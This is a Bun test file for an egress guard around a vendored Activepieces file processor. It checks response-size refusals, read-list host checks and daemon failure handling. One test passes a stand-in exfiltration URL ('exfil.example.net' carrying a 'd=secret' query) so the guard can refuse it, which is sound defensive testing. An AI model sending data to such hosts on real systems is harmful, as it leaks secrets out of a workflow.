/**
 * #1153: a file URL whose download is past the response cap fails the step.
 * The vendored file processor turns any download error but a refusal into an
 * empty file, which an HTTP form-data step would then send without its
 * attachment. The guard reports an oversized response as a refusal
 * (`ResponseTooLargeError`, proven on a real oversized body in
 * `http-egress.test.ts`), so the processor fails the step on it as it does on
 * a refused address.
 */
import { expect, mock, test } from 'bun:test';
import { EgressRefusedError, egressRefusalIn, ResponseTooLargeError } from '../../runtime/http-egress';

mock.module('@activepieces/pieces-framework', () => ({
  ApFile: class { constructor(public filename: string, public data: Buffer, public extension?: string) {} },
}));
mock.module('@activepieces/shared', () => ({
  isNil: (v: unknown) => v === null || v === undefined,
  isString: (v: unknown) => typeof v === 'string',
  isBase64: () => false,
}));
// A non-literal specifier keeps tsc out of the vendored tree, which it does not type-check.
const vendored = '../../activepieces/packages/server/engine/src/lib/variables/processors/file';
const { fileProcessor } = await import(vendored) as { fileProcessor: (p: unknown, v: string, c?: { apiUrl: string; engineToken: string }) => Promise<unknown> };

/** A daemon answering the read-hosts route (#1153) with `hosts`, or with `status`. */
function daemon(hosts: unknown, status = 200) {
  const asked: string[] = [];
  const server = Bun.serve({ port: 0, hostname: '127.0.0.1', fetch(req) {
    asked.push(`${new URL(req.url).pathname} ${req.headers.get('authorization')}`);
    return Response.json({ hosts }, { status });
  } });
  return { context: { apiUrl: `http://127.0.0.1:${server.port}/`, engineToken: 'engine-token' }, asked, stop: () => server.stop(true) };
}

test('an oversized download is a refusal, which the file processor fails the step on; text that names no file is told so', async () => {
  const tooLarge = new ResponseTooLargeError('HTTP response refused: it is larger than the cap');
  expect(tooLarge).toBeInstanceOf(EgressRefusedError);
  expect(egressRefusalIn({ cause: tooLarge })).toBe(tooLarge);
  // A refusal reaches the step as itself (loopback, listed, stands in for any refusal the guard makes).
  const d = daemon(['127.0.0.1']);
  try {
    await expect(fileProcessor({}, 'http://127.0.0.1:9/big.pdf', d.context)).rejects.toThrow(/resolves to 127\.0\.0\.1/);
    // Text that names no file is told so in plain words (file chaining).
    expect(await fileProcessor({}, 'not a url', d.context).catch((e: Error) => e.message)).toMatch(/needs a file from an earlier step/);
  } finally { d.stop(); }
});

test('#1153: a file field is fetched only from a host on the flow read list, which the engine asks the daemon for', async () => {
  const d = daemon(['files.example.com']);
  try {
    await expect(fileProcessor({}, 'https://exfil.example.net/x.pdf?d=secret', d.context))
      .rejects.toThrow(/File download refused: exfil\.example\.net is not on this workflow's read list/);
    expect(d.asked).toEqual(['/v1/jarvis/read-hosts Bearer engine-token']);
  } finally { d.stop(); }
  // No workflow to ask, or a list that cannot be read: nothing is fetched.
  await expect(fileProcessor({}, 'https://files.example.com/x.pdf')).rejects.toThrow(/no workflow to check its read list against/);
  // The daemon unreachable: refused, not an empty file the step would send without it (#1153 review).
  const gone = daemon([]); gone.stop();
  await expect(fileProcessor({}, 'https://files.example.com/x.pdf', gone.context)).rejects.toThrow(/read list could not be read \(unreachable\)/);
  const broken = daemon(null, 500);
  try { await expect(fileProcessor({}, 'https://files.example.com/x.pdf', broken.context)).rejects.toThrow(/read list could not be read \(500\)/); }
  finally { broken.stop(); }
});
